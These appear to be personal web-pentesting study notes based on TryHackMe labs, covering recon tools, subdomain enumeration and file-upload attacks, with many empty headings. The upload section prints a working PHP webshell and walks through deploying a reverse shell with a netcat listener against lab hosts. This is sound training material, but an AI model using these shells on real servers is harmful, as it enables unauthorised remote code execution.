# Webb-app

## Table of content
-----------------------------------------------------------------------------------------------------------------
- [tools](#tools)
  - [XSRFProbe](#XSRFProbe)
  - [sublist3r](#sublist3r)
  - [Hakrawler](#Hakrawler)
  - [gau](#gau)
  - [dnsrecon](#dnsrecon)
  - [ffuf](#ffuf)
  - [wfuzz](#wfuzz)
  - [gobuster](#gobuster)
  - [wafw00f](#wafw00f)
  - [feroxbuster](#feroxbuster)
  - [nikto](#nikto)
  - [whatweb](#whatweb)
-----------------------------------------------------------------------------------------------------------------
- [Introduction to Web Applications](#Introduction-to-Web-Applications)
- [Web Application Layout](#Web-Application-Layout)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - 
- [Front End vs Back End](#Front-End-vs-Back-End)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [HTML](#HTML)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [Cascading Style Sheets CSS](#Cascading-Style-Sheets-CSS)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [JavaScript](#JavaScript)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [Sensitive Data Exposure](#Sensitive-Data-Exposure)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [HTML Injection](#HTML-Injection)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [Cross Site Scripting XSS](#Cross-Site-Scripting-XSS)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [Cross Site Request Forgery CSRF](#Cross-Site-Request-Forgery-CSRF)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [Back End Servers](#Back-End-Servers)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [Web Servers](#Web-Servers)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [Databases](#Databases)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [Development Frameworks and APIs](#Development-Frameworks-and-APIs)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [Common Web Vulnerabilities](#Common-Web-Vulnerabilities)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
- [Public Vulnerabilities](#Public-Vulnerabilities)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  
-----------------------------------------------------------------------------------------------------------------

- [Information gathering - web edition](#Information-gathering---web-edition)
  - [Information Gathering](#Information-Gathering)
  - [WHOIS](#WHOIS)
  - [DNS](#)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
  - [Passive Subdomain Enumeration](#Passive-Subdomain-Enumeration)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
  - [Passive Infrastructure Identification](#Passive-Infrastructure-Identification)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
  - [Active Infrastructure Identification](#Active-Infrastructure-Identification)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
  - [Active Subdomain Enumeration](#Active-Subdomain-Enumeration)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
  - [Virtual Hosts](#Virtual-Hosts)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
  - [Crawling](#Crawling)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
    - [](#)
  

-----------------------------------------------------------------------------------------------------------------
- [Google Hacking or Dorking](#Google-Hacking-or-Dorking)

-----------------------------------------------------------------------------------------------------------------
- [subdomain enumeration](#subdomain-enumeration)
  - [Brief](#Brief)
  - [OSINT  SSL TLS Certificates](#OSINT-SSL-TLS-Certificates)
  - [OSINT Search Engines](#OSINT-Search-Engines)
  - [DNS Bruteforce](#DNS-Bruteforce)
  - [OSINT Sublist3r](#OSINT-Sublist3r)
  - [Virtual Hosts](#Virtual-Hosts)
-----------------------------------------------------------------------------------------------------------------
- [basic upload vulnerabilities](#basic-upload-vulnerabilities)
  - [tips](#tips)
  - [resources](#resources)
  - [Introduction](#Introduction)
  - [General Methodology](#General-Methodology)
  - [Overwriting Existing Files](#Overwriting-Existing-Files)
  - [Remote Code Execution](#Remote-Code-Execution)
  - [Filtering](#Filtering)
  - [Bypassing Client Side Filtering](#Bypassing-Client-Side-Filtering)
  - [Bypassing Server Side Filtering File Extensions](#Bypassing-Server-Side-Filtering-File-Extensions)
  - [Bypassing Server Side Filtering Magic Numbers](#Bypassing-Server-Side-Filtering-Magic-Numbers)
  - [Example Methodology](#Example-Methodology)
-----------------------------------------------------------------------------------------------------------------
- [owasp top 10](#owasp-top-10)
- [Broken Access Control](#Broken-Access-Control)
- [Cryptographic Failures ](#Cryptographic-Failures)
-----------------------------------------------------------------------------------------------------------------
- [Injection](#Injection)
  - [sql cheat sheet and resources](#sql-cheat-sheet-and-resources)
  - [basic SQL](#basic-SQL)
  - [What is SQL Injection](#What-is-SQL-Injection)
  - [In Band SQLi](#In-Band-SQLi)
  - [Blind SQLi Authentication Bypass](#Blind-SQLi-Authentication-Bypass)¨
  - [Blind SQLi Boolean Based](#Blind-SQLi-Boolean-Based)
  - [Blind SQLi Time Based](#Blind-SQLi-Time-Based)
  - [Out of Band SQLi](#Out-of-Band-SQLi)
  - [SQL injection Remediation](#SQL-injection-Remediation)
  - [Cross site Scripting](#Cross-site-Scripting)
  - [xss payload cheat sheets and resources](#xss-payload-cheat-sheets-and-resources)
  - [XSS Payloads](#XSS-Payloads)
  - [Reflected XSS](#Reflected-XSS)
  - [Stored XSS](#Stored-XSS)
  - [DOM Based XSS](#DOM-Based-XSS)
  - [Blind XSS](#Blind-XSS)
  - [Perfecting your payload](#Perfecting-your-payload)
  - [Practical Example Blind XSS](#Practical-Example-Blind-XSS)
  - [Command Injection](#Command-Injection)
  - [resources and cheat sheets](#resources-and-cheat-sheets)
  - [Discovering Command Injection](#Discovering-Command-Injection)
  - [Exploiting Command Injection](#Exploiting-Command-Injection)
  - [Remediating Command Injection](#Remediating-Command-Injection)
-----------------------------------------------------------------------------------------------------------------
- [Insecure Design](#Insecure-Design)
- [Security Misconfiguration](#Security-Misconfiguration)
- [Vulnerable and Outdated Components](#Vulnerable-and-Outdated-Components)
- [Identification and Authentication Failures](#Identification-and-Authentication-Failures)
- [Software and Data Integrity Failures](#Software-and-Data-Integrity-Failures)
- [Security Logging and Monitoring Failures](#Security-Logging-and-Monitoring-Failures)
- [Server-Side Request Forgery](#Server-Side-Request-Forgery)
- [Server Side Template Injection](#Server-Side-Template-Injection)
-----------------------------------------------------------------------------------------------------------------
- [File Inclusion ](#File-Inclusion)
  - [Path Traversal](#Path-Traversal)
  - [Local File Inclusion LFI](#Local-File-Inclusion-LFI)
  - [Remote File Inclusion RFI](#Remote-File-Inclusion-RFI)
  - [LFI and RFI Remediation](#LFI-and-RFI-Remediation)
-----------------------------------------------------------------------------------------------------------------
- [JWT token](#JWT-token)
  - [JWT tools](#JWT-tools)
  - [JWT resources](#JWT-resources)
-----------------------------------------------------------------------------------------------------------------
- [IDOR](#IDOR)
  - [An IDOR Example](#An-IDOR-Example)
  - [Finding IDORs in Encoded IDs](#Finding-IDORs-in-Encoded-IDs)
  - [Finding IDORs in Hashed IDs](#Finding-IDORs-in-Hashed-IDs)
  - [Finding IDORs in Unpredictable IDs](#Finding-IDORs-in-Unpredictable-IDs)
  - [Where are IDORs located](#Where-are-IDORs-located)
  - [A small Practical IDOR Example](#A-small-Practical-IDOR-Example)
-----------------------------------------------------------------------------------------------------------------
 
 



### tools
#### XSRFProbe

The Prime Cross Site Request Forgery (CSRF) Audit and Exploitation Toolkit. 

XSRFProbe is an advanced Cross Site Request Forgery (CSRF/XSRF) Audit and Exploitation Toolkit. Equipped with a powerful crawling engine and numerous systematic checks, it is able to detect most cases of CSRF vulnerabilities, their related bypasses and futher generate (maliciously) exploitable proof of concepts with each found vulnerability.

```
https://github.com/0xInfection/XSRFProbe
```

#### sublist3r
Search for subdomains 

This package contains a Python tool designed to enumerate subdomains of websites using OSINT. It helps penetration testers and bug hunters collect and gather subdomains for the domain they are targeting. Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu, and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS.

Subbrute was integrated with Sublist3r to increase the possibility of finding more subdomains using bruteforce with an improved wordlist, thanks to TheRook, author of subbrute.

```
https://www.kali.org/tools/sublist3r/
```

![image](https://user-images.githubusercontent.com/24814781/183069682-989257b9-5886-4ac5-9b2c-d2c9390be764.png)

example:
```
sublist3r -d suljov.com
```

#### Hakrawler
Simple, fast web crawler designed for easy, quick discovery of endpoints and assets within a web application

```
https://github.com/hakluke/hakrawler.git
```
```
https://www.kali.org/tools/hakrawler/
```
![image](https://user-images.githubusercontent.com/24814781/183069804-b0abf502-fd93-4d88-84cb-22f016267224.png)

example:
```
echo http://10.10.111.186 | hakrawler
```


#### gau
```
https://www.kali.org/tools/getallurls/
```
```
https://github.com/lc/gau
```

#### dnsrecon

DNSRecon is a Python script that provides the ability to perform:

Check all NS Records for Zone Transfers.

Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT).

Perform common SRV Record Enumeration.

Top Level Domain (TLD) Expansion.

Check for Wildcard Resolution.

Brute Force subdomain and host A and AAAA records given a domain and a wordlist.

Perform a PTR Record lookup for a given IP Range or CIDR.

Check a DNS Server Cached records for A, AAAA and CNAME

Records provided a list of host records in a text file to check.

Enumerate Hosts and Subdomains using Google

```
https://www.kali.org/tools/dnsrecon/
```
![image](https://user-images.githubusercontent.com/24814781/183069087-973c4eb4-ea06-4277-af20-8623447feac5.png)


#### ffuf
ffuf is a fest web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing.

![image](https://user-images.githubusercontent.com/24814781/183070870-1f39ec68-8b9f-4945-aedb-6e2398cedb1f.png)

![image](https://user-images.githubusercontent.com/24814781/183070946-7a298c75-9f21-4bde-8019-f45966d3ba0f.png)

#### wfuzz

Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked directories, servlets, scripts, etc, bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing, etc.


### gobuster
Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains.

```
root@kali:~# gobuster -h
Usage:
  gobuster [command]

Available Commands:
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode

Flags:
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -h, --help              help for gobuster
      --no-error          Don't display errors
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -p, --pattern string    File containing replacement patterns
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist

Use "gobuster [command] --help" for more information about a command.
```



#### basic examples:
directory enum:
```
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

sub-domain enum:
```
gobuster vhost -u http://<ip/domain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```


### wafw00f 
WAFW00F allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.
```
https://github.com/EnableSecurity/wafw00f
```

### feroxbuster
feroxbuster is a tool designed to perform Forced Browsing. Forced browsing is an attack where the aim is to enumerate and access resources that are not referenced by the web application, but are still accessible by an attacker. feroxbuster uses brute force combined with a wordlist to search for unlinked content in target directories. These resources may store sensitive information about web applications and operational systems, such as source code, credentials, internal network addressing, etc… This attack is also known as Predictable Resource Location, File Enumeration, Directory Enumeration, and Resource Enumeration.

```
sudo apt install feroxbuster
```
basic usage example: 
```
feroxbuster --url http://<url or ip>/ --wordlist <path to a wordlist>
```


### nikto
Nikto is a pluggable web server and CGI scanner written in Perl, using rfp’s LibWhisker to perform fast security or informational checks.

Features:

*    Easily updatable CSV-format checks database
*    Output reports in plain text or HTML
*    Available HTTP versions automatic switching
*    Generic as well as specific server software checks
*    SSL support (through libnet-ssleay-perl)
*    Proxy support (with authentication)
*    Cookies support

```
sudo apt install nikto
```
basic usgae example: 
```
nikto -h http://<url or ip>/ -C all
```


### whatweb
WhatWeb identifies websites. It recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.

WhatWeb has over 900 plugins, each to recognise something different. It also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.
```
sudo apt install whatweb
```


-----------------------------------------------------------------------------------------------------------------
## Introduction to Web Applications

### Web Application Layout

### Front End vs Back End

### HTML

### Cascading Style Sheets CSS

### JavaScript

### Sensitive Data Exposure

### HTML Injection

### Cross Site Scripting XSS

### Cross Site Request Forgery CSRF

### Back End Servers

### Web Servers

### Databases

### Development Frameworks and APIs

### Common Web Vulnerabilities

### Public Vulnerabilities

-----------------------------------------------------------------------------------------------------------------

## Information gathering - web edition

### Information Gathering
The information gathering
```
https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/README
```
phase is the first step in every penetration test where we need to simulate external attackers without internal information from the target organization. This phase is crucial as poor and rushed information gathering could result in missing flaws that otherwise thorough enumeration would have uncovered.

![image](https://user-images.githubusercontent.com/24814781/198901285-44ecc3a1-6717-4229-bde2-96d31114c331.png)

This phase helps us understand the attack surface, technologies used, and, in some cases, discover development environments or even forgotten and unmaintained infrastructure that can lead us to internal network access as they are usually less protected and monitored. Information gathering is typically an iterative process. As we discover assets (say, a subdomain or virtual host), we will need to fingerprint the technologies in use, look for hidden pages/directories, etc., which may lead us to discover another subdomain and start the process over again.

For example, we can think of it as stumbling across new subdomains during one of our penetration tests based on the SSL certificate. However, if we take a closer look at these subdomains, we will often see different technologies in use than the main company website. Subdomains and vhosts are used to present other information and perform other tasks that have been separated from the homepage. Therefore, it is essential to find out which technologies are used, what purpose they serve, and how they work. During this process, our objective is to identify as much information as we can from the following areas:

![image](https://user-images.githubusercontent.com/24814781/198901302-8e0888fc-11e3-45d8-841b-c8bf27d59882.png)

We can break the information gathering process into two main categories:

![image](https://user-images.githubusercontent.com/24814781/198901326-9b519fdb-8fbb-45d1-86c1-76160f350c7e.png)

It is crucial to keep the information that we collect well-organized as we will need various pieces of data as inputs for later phasing of the testing process. Depending on the type of assessment we are performing, we may need to include some of this enumeration data in our final report deliverable (such as an External Penetration Test). When writing up a bug bounty report, we will only need to include details relevant specifically to the bug we are reporting (i.e., a hidden subdomain that we discovered led to the disclosure of another subdomain that we leveraged to obtain remote code execution (RCE) against our target.

It is worth signing up for an account at Hackerone,
```
`https://hackerone.com/bug-bounty-programs 
```
perusing the program list, and choosing a few targets to reproduce all of the examples in this module. Practice makes perfect. Continuously practicing these techniques will help us hone our craft and make many of these information gathering steps second nature. As we become more comfortable with the tools and techniques shown throughout this module, we should develop our own, repeatable methodology. We may find that we like specific tools and command-line techniques for some phases of information gathering and discover different tools that we prefer for other phases. We may want to write out our own scripts to automate some of these phases as well.

## WHOIS

We can consider WHOIS
```
https://en.wikipedia.org/wiki/WHOIS
```
as the "white pages" for domain names. It is a TCP-based transaction-oriented query/response protocol listening on TCP port 43 by default. We can use it for querying databases containing domain names, IP addresses, or autonomous systems and provide information services to Internet users. The protocol is defined in RFC 3912.
```
https://datatracker.ietf.org/doc/html/rfc3912
```

-----------------------------------------------------------------------------------------------------------------


### Google Hacking or Dorking
There are also external resources available that can help in discovering information about your target website; these resources are often referred to as OSINT or (Open-Source Intelligence) as they're freely available tools that collect information:

#### Google Hacking / Dorking

Google hacking / Dorking utilizes Google's advanced search engine features, which allow you to pick out custom content. You can, for instance, pick out results from a certain domain name using the site: filter, for example (site:tryhackme.com) you can then match this up with certain search terms, say, for example, the word admin (site:tryhackme.com admin) this then would only return results from the tryhackme.com website which contain the word admin in its content. You can combine multiple filters as well. Here is an example of more filters you can use:

![image](https://user-images.githubusercontent.com/24814781/191031949-334cbeaa-a90d-4a3f-ad7e-f3b89eeadee3.png)

More information about google hacking can be found here:
```
https://en.wikipedia.org/wiki/Google_hacking
```
The first WHOIS directory was created in the early 1970s by Elizabeth Feinler
```
https://en.wikipedia.org/wiki/Elizabeth_J._Feinler
```
and her team working out of Stanford University's Network Information Center (NIC). Together with her team, they created domains divided into categories based upon a computer's physical address. We can read more about the fascinating history of WHOIS here.
```
https://en.wikipedia.org/wiki/WHOIS#History
```

The WHOIS domain lookups allow us to retrieve information about the domain name of an already registered domain. The Internet Corporation of Assigned Names and Numbers (ICANN) 

```
https://www.icann.org/get-started
```

requires that accredited registrars enter the holder's contact information, the domain's creation, and expiration dates, and other information in the Whois database immediately after registering a domain. In simple terms, the Whois database is a searchable list of all domains currently registered worldwide.

WHOIS lookups were initially performed using command-line tools. Nowadays, many web-based tools exist, but command-line options often give us the most control over our queries and help filter and sort the resultant output. Sysinternals WHOIS

```
https://learn.microsoft.com/en-gb/sysinternals/downloads/whois
``` 

for Windows or Linux WHOIS
```
https://linux.die.net/man/1/whois
```

command-line utility are our preferred tools for gathering information. However, there are some online versions like whois.domaintools.com

```
https://whois.domaintools.com/
```

we can also use.

We would get the following response from the previous command to run a whois lookup against the facebook.com domain. An example of this whois command is:

![image](https://user-images.githubusercontent.com/24814781/198901571-18298ea6-3b92-47bc-be76-a507cf3b2023.png)

We can gather the same data using whois.exe from Windows Sysinternals:

![image](https://user-images.githubusercontent.com/24814781/198901591-2e940673-1866-45c1-a294-2b6e790210b4.png)

From this output, we have gathered the following information:

![image](https://user-images.githubusercontent.com/24814781/198901610-1d563d6d-a8e1-42f1-8e21-231edd3aad88.png)

Though none of this information on its own is enough for us to mount an attack, it is essential data that we want to note down for later.


-----------------------------------------------------------------------------------------------------------------


### subdomain enumeration

####  Brief
Subdomain enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potential points of vulnerability.

We will explore three different subdomain enumeration methods: Brute Force, OSINT (Open-Source Intelligence) and Virtual Host.

#### OSINT  SSL TLS Certificates

When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like 
```
https://crt.sh 
```
and 
```
https://ui.ctsearch.entrust.com/ui/ctsearchui
```
offer a searchable database of certificates that shows current and historical results.

#### OSINT Search Engines

Search engines contain trillions of links to more than a billion websites, which can be an excellent resource for finding new subdomains. Using advanced search methods on websites like Google, such as the site: filter, can narrow the search results. For example, "-site:www.domain.com site:*.domain.com" would only contain results leading to the domain name domain.com but exclude any links to www.domain.com; therefore, it shows us only subdomain names belonging to domain.com.

#### DNS Bruteforce 

Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker. In this instance, we are using a tool called dnsrecon to perform this.

example of brute force using dnsrecon:
```
dnsrecon -t brt -d suljov.com
```

#### OSINT Sublist3r

To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like Sublist3r
```
https://github.com/aboul3la/Sublist3r
```
example: 
```
sublist3r -d suljov.com
```

#### Virtual Hosts

Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. 


Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.


Like with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains.


Start an AttackBox and then try the following command against the Acme IT Support machine to try and discover a new subdomain.

```
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.111.186
```

The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.
Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.

```        
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.111.186 -fs {size}
```

This command has a similar syntax to the first apart from the -fs switch, which tells ffuf to ignore any results that are of the specified size.
------------------------------------------------------------------------------------------------------------------

### basic upload vulnerabilities

#### tips

when looking and enumerating etc use tools like:
* wappalyzer
* source code
* burp suite
* inspect element gobuster/dirsearch
* change file with hexeditor

be patient

try to understand the framwork its not alwasy php shells etc maybe its node.js etc. 


#### resources 
```
https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities
```

#### Introduction 

The ability to upload files to a server has become an integral part of how we interact with web applications. Be it a profile picture for a social media website, a report being uploaded to cloud storage, or saving a project on Github; the applications for file upload features are limitless.

Unfortunately, when handled badly, file uploads can also open up severe vulnerabilities in the server. This can lead to anything from relatively minor, nuisance problems; all the way up to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. With unrestricted upload access to a server (and the ability to retrieve data at will), an attacker could deface or otherwise alter existing content -- up to and including injecting malicious webpages, which lead to further vulnerabilities such as XSS or CSRF. By uploading arbitrary files, an attacker could potentially also use the server to host and/or serve illegal content, or to leak sensitive information. Realistically speaking, an attacker with the ability to upload a file of their choice to your server -- with no restrictions -- is very dangerous indeed.

The purpose of this room is to explore some of the vulnerabilities resulting from improper (or inadequate) handling of file uploads. Specifically, we will be looking at:

*    Overwriting existing files on a server
*    Uploading and Executing Shells on a server
*    Bypassing Client-Side filtering
*    Bypassing various kinds of Server-Side filtering
*    Fooling content type validation checks

#### General Methodology

So, we have a file upload point on a site. How would we go about exploiting it?

As with any kind of hacking, enumeration is key. The more we understand about our environment, the more we're able to do with it. Looking at the source code for the page is good to see if any kind of client-side filtering is being applied. Scanning with a directory bruteforcer such as Gobuster is usually helpful in web attacks, and may reveal where files are being uploaded to; Gobuster is no longer installed by default on Kali, but can be installed with sudo "apt install gobuster". Intercepting upload requests with Burpsuite will also come in handy. Browser extensions such as Wappalyser
```
https://www.wappalyzer.com/apps
```
can provide valuable information at a glance about the site you're targetting.

With a basic understanding of how the website might be handling our input, we can then try to poke around and see what we can and can't upload. If the website is employing client-side filtering then we can easily look at the code for the filter and look to bypass it (more on this later!). If the website has server-side filtering in place then we may need to take a guess at what the filter is looking for, upload a file, then try something slightly different based on the error message if the upload fails. Uploading files designed to provoke errors can help with this. Tools like Burpsuite or OWASP Zap can be very helpful at this stage.

We'll go into a lot more detail about bypassing filters in later tasks.


#### Overwriting Existing Files

When files are uploaded to the server, a range of checks should be carried out to ensure that the file will not overwrite anything which already exists on the server. Common practice is to assign the file with a new name -- often either random, or with the date and time of upload added to the start or end of the original filename. Alternatively, checks may be applied to see if the filename already exists on the server; if a file with the same name already exists then the server will return an error message asking the user to pick a different file name. File permissions also come into play when protecting existing files from being overwritten. Web pages, for example, should not be writeable to the web user, thus preventing them from being overwritten with a malicious version uploaded by an attacker.

If, however, no such precautions are taken, then we might potentially be able to overwrite existing files on the server. Realistically speaking, the chances are that file permissions on the server will prevent this from being a serious vulnerability. That said, it could still be quite the nuisance, and is worth keeping an eye out for in a pentest or bug hunting environment. 

In the following image we have a web page with an upload form:

![image](https://user-images.githubusercontent.com/24814781/183395794-4f121298-3536-4076-800c-629ac88ba24f.png)

You may need to enumerate more than this for a real challenge; however, in this instance, let's just take a look at the source code of the page:

![image](https://user-images.githubusercontent.com/24814781/183395820-a2f4768f-ab4e-4791-9ec8-bf745f93a5c8.png)

Inside the red box, we see the code that's responsible for displaying the image that we saw on the page. It's being sourced from a file called "spaniel.jpg", inside a directory called "images".

Now we know where the image is being pulled from -- can we overwrite it?

Let's download another image from the internet and call it spaniel.jpg. We'll then upload it to the site and see if we can overwrite the existing image:

![image](https://user-images.githubusercontent.com/24814781/183395966-6a019616-6982-4da9-b12a-20b834886c4b.png)

![image](https://user-images.githubusercontent.com/24814781/183396041-452fc07f-4087-4b9d-882a-0d60af42a134.png)

And our attack was successful! We managed to overwrite the original images/spaniel.jpg with our own copy.


#### Remote Code Execution

It's all well and good overwriting files that exist on the server. That's a nuisance to the person maintaining the site, and may lead to some vulnerabilities, but let's go further; let's go for RCE!

Remote Code Execution (as the name suggests) would allow us to execute code arbitrarily on the web server. Whilst this is likely to be as a low-privileged web user account (such as www-data on Linux servers), it's still an extremely serious vulnerability. Remote code execution via an upload vulnerability in a web application tends to be exploited by uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute). Traditionally this would be PHP, however, in more recent times, other back-end languages have become more common (Python Django and Javascript in the form of Node.js being prime examples). It's worth noting that in a routed application (i.e. an application where the routes are defined programmatically rather than being mapped to the file-system), this method of attack becomes a lot more complicated and a lot less likely to occur. Most modern web frameworks are routed programmatically.

There are two basic ways to achieve RCE on a webserver when exploiting a file upload vulnerability: webshells, and reverse/bind shells. Realistically a fully featured reverse/bind shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads, or if firewall rules prevent any network-based shells). We'll take a look at each of these in turn. As a general methodology, we would be looking to upload a shell of one kind or another, then activating it, either by navigating directly to the file if the server allows it (non-routed applications with inadequate restrictions), or by otherwise forcing the webapp to run the script for us (necessary in routed applications).

Web shells:

Let's assume that we've found a webpage with an upload form:

![image](https://user-images.githubusercontent.com/24814781/183399650-e9605734-0019-40c3-b5e6-d7a937625936.png)

Where do we go from here? Well, let's start with a gobuster scan:

![image](https://user-images.githubusercontent.com/24814781/183399684-82372801-479e-4a86-a6b1-6b3d52a83055.png)

Looks like we've got two directories here -- uploads and assets. Of these, it seems likely that any files we upload will be placed in the "uploads" directory. We'll try uploading a legitimate image file first. Here I am choosing our cute dog photo from the previous task:

![image](https://user-images.githubusercontent.com/24814781/183399715-44b19823-16f8-4329-9c2f-f72306128837.png)

![image](https://user-images.githubusercontent.com/24814781/183399775-ca018c57-7d6b-4432-9805-6ced8ec384ac.png)

Now, if we go to http://demo.uploadvulns.thm/uploads we should see that the spaniel picture has been uploaded!

![image](https://user-images.githubusercontent.com/24814781/183399803-100c5774-5ee3-4580-b718-3ade0de8ca54.png)


![image](https://user-images.githubusercontent.com/24814781/183399823-cecbb47a-ab2a-4a3c-9029-de14b2e8be55.png)

Ok, we can upload images. Let's try a webshell now.

As it is, we know that this webserver is running with a PHP back-end, so we'll skip straight to creating and uploading the shell. In real life, we may need to do a little more enumeration; however, PHP is a good place to start regardless.

A simple webshell works by taking a parameter and executing it as a system command. In PHP, the syntax for this would be:
```
<?php
    echo system($_GET["cmd"]);
?>   
```
This code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.

Let's try uploading it to the site, then using it to show our current user and the contents of the current directory:

![image](https://user-images.githubusercontent.com/24814781/183400037-5ef3552b-4cd2-41d1-9ae7-a4035cfef3ba.png)

Success!

We could now use this shell to read files from the system, or upgrade from here to a reverse shell. Now that we have RCE, the options are limitless. Note that when using webshells, it's usually easier to view the output by looking at the source code of the page. This drastically improves the formatting of the output.

Reverse Shells:

The process for uploading a reverse shell is almost identical to that of uploading a webshell, so this section will be shorter. We'll be using the ubiquitous Pentest Monkey reverse shell, which comes by default on Kali Linux, but can also be downloaded here.
```
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

You will need to edit line 49 of the shell. It will currently say $ip = '127.0.0.1';  // CHANGE THIS
 -- as it instructs, change 127.0.0.1 to your TryHackMe tun0 IP address, which can be found on the access page. You can ignore the following line, which also asks to be changed. With the shell edited, the next thing we need to do is start a Netcat listener to receive the connection. nc -lvnp 1234:
 
 ![image](https://user-images.githubusercontent.com/24814781/183400403-1a81b476-35bb-4c31-b0d2-4717d268dbf8.png)

Now, let's upload the shell, then activate it by navigating to <this is just an example> http://demo.uploadvulns.thm/uploads/shell.php. The name of the shell will obviously be whatever you called it (php-reverse-shell.php by default).

The website should hang and not load properly -- however, if we switch back to our terminal, we have a hit!

![image](https://user-images.githubusercontent.com/24814781/183400537-05affca4-28fd-47e3-8f45-163b9197e706.png)

Once again, we have obtained RCE on this webserver. From here we would want to stabilise our shell and escalate our privileges, but those are tasks for another time. For now, it's time you tried this for yourself!

#### Filtering

Up until now we have largely been ignoring the counter-defences employed by web developers to defend against file upload vulnerabilities. Every website that you've successfully attacked so far in this room has been completely insecure. It's time that changed. From here on out, we'll be looking at some of the defence mechanisms used to prevent malicious file uploads, and how to circumvent them.

First up, let's discuss the differences between client-side filtering and server-side filtering.

When we talk about a script being "Client-Side", in the context of web applications, we mean that it's running in the user's browser as opposed to on the web server itself. JavaScript is pretty much ubiquitous as the client-side scripting language, although alternatives do exist.  Regardless of the language being used, a client-side script will be run in your web browser. In the context of file-uploads, this means that the filtering occurs before the file is even uploaded to the server. Theoretically, this would seem like a good thing, right? In an ideal world, it would be; however, because the filtering is happening on our computer, it is trivially easy to bypass. As such client-side filtering by itself is a highly insecure method of verifying that an uploaded file is not malicious.

